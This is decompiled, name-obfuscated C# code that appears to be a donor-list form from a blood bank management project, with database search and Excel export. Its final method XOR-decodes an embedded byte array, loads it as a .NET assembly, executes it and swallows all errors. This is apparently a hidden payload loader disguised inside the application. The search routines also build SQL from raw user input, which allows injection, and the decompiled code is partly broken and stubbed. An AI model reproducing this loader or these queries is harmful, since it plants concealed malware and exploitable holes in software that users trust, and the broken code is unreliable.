using System;
using System.Collections;
using System.Data;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Bt4;
using Jg5;
using Ma2;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using d1Y;
using g7C;

namespace Lk5;

public class n6E
{
	internal sealed class Ks3
	{
		internal PictureBox I;

		internal Label L;

		internal Label F;

		internal CheckBox t;

		internal Ks3()
		{
		}
	}

	private object W;

	private object D;

	private Be5.Wb5 I = new Be5.Wb5();

	public object O
	{
		get
		{
			return D;
		}
		set
		{
			D = RuntimeHelpers.GetObjectValue(value);
		}
	}

	private Control x
	{
		get
		{
			throw new NotImplementedException();
		}
	}

	private void s7A(object sender, EventArgs e)
	{
		Xx5();
		f9H.y0K();
	}

	private void Xx5()
	{
		throw new NotImplementedException();
	}

	private void Jg4(object sender, EventArgs e)
	{
		Ey5();
	}

	public void Ey5()
	{
		//IL_066a: Unknown result type (might be due to invalid IL or missing references)
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		NewLateBinding.LateSet(objectValue, (Type)null, "Visible", new object[1] { false }, (string[])null, (Type[])null);
		IEnumerable enumerable = "C:\\Users\\Jeffrey Banico\\Desktop\\EDP\\BIMS - FINAL PROJECT\\templates\\";
		ICloneable cloneable = "C:\\Users\\Jeffrey Banico\\Desktop\\EDP\\BIMS - FINAL PROJECT\\donorlist\\";
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(objectValue, (Type)null, "Workbooks", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Open", new object[1] { (enumerable as string) + "donor.xlsx" }, (string[])null, (Type[])null, (bool[])null));
		object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, (Type)null, "Worksheets", new object[1] { 1 }, (string[])null, (Type[])null, (bool[])null));
		NewLateBinding.LateSet(objectValue3, (Type)null, "Cells", new object[3] { 1, 1, "Donor List" }, (string[])null, (Type[])null);
		int num = 5;
		int num2 = Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(I.I, (Type)null, "RowCount", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1));
		checked
		{
			for (int i = 0; i <= num2; i++)
			{
				object obj = objectValue3;
				object[] obj2 = new object[3] { num, 1, null };
				Array array;
				Array array2;
				object obj3 = NewLateBinding.LateGet(I.I, (Type)null, "Rows", (object[])(array = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array2 = new bool[1] { true }));
				if (((bool[])array2)[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((array as object[])[0]), typeof(int));
				}
				obj2[2] = Operators.ConcatenateObject((object)"'", NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { "donorId" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateSet(obj, (Type)null, "Cells", obj2, (string[])null, (Type[])null);
				object obj4 = objectValue3;
				object[] obj5 = new object[3] { num, 2, null };
				obj3 = NewLateBinding.LateGet(I.I, (Type)null, "Rows", (object[])(array = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array2 = new bool[1] { true }));
				if (((bool[])array2)[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((array as object[])[0]), typeof(int));
				}
				obj5[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { "donorFname" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj4, (Type)null, "Cells", obj5, (string[])null, (Type[])null);
				object obj6 = objectValue3;
				object[] obj7 = new object[3] { num, 3, null };
				obj3 = NewLateBinding.LateGet(I.I, (Type)null, "Rows", (object[])(array = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array2 = new bool[1] { true }));
				if ((array2 as bool[])[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((array as object[])[0]), typeof(int));
				}
				obj7[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { "donorLname" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj6, (Type)null, "Cells", obj7, (string[])null, (Type[])null);
				object obj8 = objectValue3;
				object[] obj9 = new object[3] { num, 4, null };
				obj3 = NewLateBinding.LateGet(I.I, (Type)null, "Rows", (object[])(array = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array2 = new bool[1] { true }));
				if ((array2 as bool[])[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((array as object[])[0]), typeof(int));
				}
				obj9[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { "donorBloodType" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj8, (Type)null, "Cells", obj9, (string[])null, (Type[])null);
				object obj10 = objectValue3;
				object[] obj11 = new object[3] { num, 5, null };
				obj3 = NewLateBinding.LateGet(I.I, (Type)null, "Rows", (object[])(array = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array2 = new bool[1] { true }));
				if ((array2 as bool[])[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue((array as object[])[0]), typeof(int));
				}
				obj11[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { "donorQty" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj10, (Type)null, "Cells", obj11, (string[])null, (Type[])null);
				object obj12 = objectValue3;
				object[] obj13 = new object[3] { num, 6, null };
				obj3 = NewLateBinding.LateGet(I.I, (Type)null, "Rows", (object[])(array = new object[1] { i }), (string[])null, (Type[])null, (bool[])(array2 = new bool[1] { true }));
				if ((array2 as bool[])[0])
				{
					i = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(((object[])array)[0]), typeof(int));
				}
				obj13[2] = NewLateBinding.LateGet(NewLateBinding.LateGet(obj3, (Type)null, "Cells", new object[1] { "donorDate" }, (string[])null, (Type[])null, (bool[])null), (Type)null, "Value", new object[0], (string[])null, (Type[])null, (bool[])null);
				NewLateBinding.LateSet(obj12, (Type)null, "Cells", obj13, (string[])null, (Type[])null);
				num++;
			}
			object obj14 = "DonorList" + DateTime.Now.ToString("MMddyy-HHmmmss") + ".xlsx";
			NewLateBinding.LateSetComplex(NewLateBinding.LateGet(objectValue, (Type)null, "ActiveWindow", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "DisplayGridlines", new object[1] { true }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(objectValue2, (Type)null, "SaveAs", new object[1] { (string)cloneable + (string)obj14 }, (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(objectValue, (Type)null, "Quit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			objectValue = null;
			objectValue2 = null;
			objectValue3 = null;
			Interaction.MsgBox((object)"File Successfully Exported", (MsgBoxStyle)0, (object)null);
		}
	}

	private void We9(object sender, EventArgs e)
	{
		Qi6();
	}

	private void Qi6()
	{
		NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		object obj = "select donor.iddonor, d_fname, d_lname, bloodtype.bloodtype, d_quantitydonated, date_donated\r\n                    FROM donor \r\n                    inner JOIN `blood` ON donor.iddonor = `blood`.iddonor\r\n                    inner join `bloodtype` on blood.idbloodtype = `bloodtype`.idbloodtype;";
		o4N();
		object obj2 = objectValue;
		NewLateBinding.LateSet(obj2, (Type)null, "Connection", new object[1] { O }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "CommandType", new object[1] { CommandType.Text }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj2, (Type)null, "CommandText", new object[1] { obj as string}, (string[])null, (Type[])null);
		obj2 = null;
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
		while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
		{
			NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { new object[6]
			{
				NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "iddonor" }, (string[])null, (Type[])null, (bool[])null),
				NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_fname" }, (string[])null, (Type[])null, (bool[])null),
				NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_lname" }, (string[])null, (Type[])null, (bool[])null),
				NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "bloodtype" }, (string[])null, (Type[])null, (bool[])null),
				NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_quantitydonated" }, (string[])null, (Type[])null, (bool[])null),
				NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "date_donated" }, (string[])null, (Type[])null, (bool[])null)
			} }, (string[])null, (Type[])null, (bool[])null, true);
		}
		r4N();
	}

	private void r4N()
	{
		throw new NotImplementedException();
	}

	private void o4N()
	{
		throw new NotImplementedException();
	}

	private void m8Z(object sender, EventArgs e)
	{
		Yf5();
	}

	private void Yf5()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		IDisposable disposable = (IDisposable)this.get_x(this, bool_0: true);
		while (disposable is Control)
		{
			if (((Control)disposable) is TextBox)
			{
				((TextBoxBase)(TextBox)(Control)disposable).Clear();
			}
			else if (((disposable is Control) ? disposable : null) is ComboBox)
			{
				object obj = (object)(ComboBox)(Control)disposable;
				((ComboBox)obj).set_SelectedIndex(-1);
			}
		}
	}

	private void o3E(object sender, EventArgs e)
	{
		IConvertible convertible = Conversions.ToString(NewLateBinding.LateGet(W, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Operators.CompareString((string)convertible, "All", false) == 0)
		{
			Qi6();
			return;
		}
		NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		ICloneable cloneable = "select donor.iddonor, d_fname, d_lname, bloodtype.bloodtype, d_quantitydonated, date_donated\r\n                    FROM donor \r\n                    inner JOIN `blood` ON donor.iddonor = `blood`.iddonor\r\n                    inner join `bloodtype` on blood.idbloodtype = `bloodtype`.idbloodtype where bloodtype.bloodtype ='" + (string)convertible + "'";
		o4N();
		object obj = objectValue;
		NewLateBinding.LateSet(obj, (Type)null, "Connection", new object[1] { O }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj, (Type)null, "CommandType", new object[1] { CommandType.Text }, (string[])null, (Type[])null);
		NewLateBinding.LateSet(obj, (Type)null, "CommandText", new object[1] { cloneable as string}, (string[])null, (Type[])null);
		obj = null;
		object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
		if (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "HasRows", new object[0], (string[])null, (Type[])null, (bool[])null)))
		{
			while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
			{
				NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { new object[6]
				{
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "iddonor" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_fname" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_lname" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "bloodtype" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_quantitydonated" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "date_donated" }, (string[])null, (Type[])null, (bool[])null)
				} }, (string[])null, (Type[])null, (bool[])null, true);
			}
			r4N();
		}
	}

	private void Kb1(object sender, EventArgs e)
	{
	}

	private void f4R(object sender, EventArgs e)
	{
		//IL_02af: Unknown result type (might be due to invalid IL or missing references)
		NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Clear", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object objectValue = RuntimeHelpers.GetObjectValue(new object());
		if (Conversions.ToBoolean(Operators.OrObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(I.w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"All", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(I.w, (Type)null, "SelectedIndex", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(-1), false))))
		{
			object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"select donor.iddonor, d_fname, d_lname, bloodtype.bloodtype, d_quantitydonated, date_donated\r\n                    FROM donor \r\n                    inner JOIN `blood` ON donor.iddonor = `blood`.iddonor\r\n                    inner join `bloodtype` on blood.idbloodtype = `bloodtype`.idbloodtype where '", NewLateBinding.LateGet(I.v, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' in (donor.iddonor, d_fname, d_lname, bloodtype.bloodtype, d_quantitydonated, date_donated) "));
			o4N();
			object obj2 = objectValue;
			NewLateBinding.LateSet(obj2, (Type)null, "Connection", new object[1] { O }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj2, (Type)null, "CommandType", new object[1] { CommandType.Text }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj2, (Type)null, "CommandText", new object[1] { (string)obj }, (string[])null, (Type[])null);
			obj2 = null;
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
			if (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "HasRows", new object[0], (string[])null, (Type[])null, (bool[])null)))
			{
				while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue2, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
				{
					NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { new object[6]
					{
						NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "iddonor" }, (string[])null, (Type[])null, (bool[])null),
						NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_fname" }, (string[])null, (Type[])null, (bool[])null),
						NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_lname" }, (string[])null, (Type[])null, (bool[])null),
						NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "bloodtype" }, (string[])null, (Type[])null, (bool[])null),
						NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "d_quantitydonated" }, (string[])null, (Type[])null, (bool[])null),
						NewLateBinding.LateGet(objectValue2, (Type)null, "Item", new object[1] { "date_donated" }, (string[])null, (Type[])null, (bool[])null)
					} }, (string[])null, (Type[])null, (bool[])null, true);
				}
				r4N();
			}
			else
			{
				MessageBox.Show("No records found");
			}
		}
		else
		{
			object obj3 = NewLateBinding.LateGet(I.w, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null);
			object obj4 = (Operators.ConditionalCompareObjectEqual(obj3, (object)"Last Name", false) ? "d_lname" : ((!Operators.ConditionalCompareObjectEqual(obj3, (object)"First Name", false)) ? "date_donated" : "d_fname"));
			object obj = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("select donor.iddonor, d_fname, d_lname, bloodtype.bloodtype, d_quantitydonated, date_donated\r\n                    FROM donor \r\n                    inner JOIN `blood` ON donor.iddonor = `blood`.iddonor\r\n                    inner join `bloodtype` on blood.idbloodtype = `bloodtype`.idbloodtype where " + (obj4 as string) + " like '"), NewLateBinding.LateGet(I.v, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"'"));
			o4N();
			object obj5 = objectValue;
			NewLateBinding.LateSet(obj5, (Type)null, "Connection", new object[1] { O }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj5, (Type)null, "CommandType", new object[1] { CommandType.Text }, (string[])null, (Type[])null);
			NewLateBinding.LateSet(obj5, (Type)null, "CommandText", new object[1] { obj as string}, (string[])null, (Type[])null);
			obj5 = null;
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, (Type)null, "ExecuteReader", new object[0], (string[])null, (Type[])null, (bool[])null));
			while (Conversions.ToBoolean(NewLateBinding.LateGet(objectValue3, (Type)null, "Read", new object[0], (string[])null, (Type[])null, (bool[])null)))
			{
				NewLateBinding.LateCall(NewLateBinding.LateGet(I.I, (Type)null, "Rows", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Add", new object[1] { new object[6]
				{
					NewLateBinding.LateGet(objectValue3, (Type)null, "Item", new object[1] { "iddonor" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue3, (Type)null, "Item", new object[1] { "d_fname" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue3, (Type)null, "Item", new object[1] { "d_lname" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue3, (Type)null, "Item", new object[1] { "bloodtype" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue3, (Type)null, "Item", new object[1] { "d_quantitydonated" }, (string[])null, (Type[])null, (bool[])null),
					NewLateBinding.LateGet(objectValue3, (Type)null, "Item", new object[1] { "date_donated" }, (string[])null, (Type[])null, (bool[])null)
				} }, (string[])null, (Type[])null, (bool[])null, true);
			}
			r4N();
		}
	}

	private void o0N(object sender, EventArgs e)
	{
		Jp2();
		q1S.s3S();
	}

	private void r2M(object sender, EventArgs e)
	{
	}

	private void Kw7(object sender, EventArgs e)
	{
	}

	private void Yr7(object sender, EventArgs e)
	{
	}

	internal static void e7Y()
	{
		throw new NotImplementedException();
	}

	internal static void Jp2()
	{
		throw new NotImplementedException();
	}

	internal static void Qp9(Cf7.Xq4 xq4_0, byte[] byte_0, int int_0)
	{
		checked
		{
			Array array = new byte[xq4_0.h.Length - 1 + 1];
			int num = xq4_0.h.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				int num2 = i + Fr7.b0B(int_0, byte_0.Length, null, null, 1);
				int num3 = num2 & int_0;
				int num4 = Fr7.b0B(i, byte_0.Length, null, null, 1);
				int num5 = byte_0[num4];
				int num6 = Convert.ToInt32(Fr7.b0B(0, 0, num5, num3, 2));
				int num7 = xq4_0.h[i];
				(array as byte[])[i] = (byte)Fr7.b0B(0, 0, num7, num6, 2);
			}
			object obj = new object[6];
			(obj as object[])[0] = "$$NoBodyCanGetIt$$";
			(obj as object[])[1] = "$$MLKjclkdsjfklsdfkghfdkhgfhmjlyil$$";
			(obj as object[])[2] = "ASAMethod0ASA";
			try
			{
				xq4_0.x = (Assembly)Be5.Tc3(array as byte[]);
				Fr7.Bn9(xq4_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
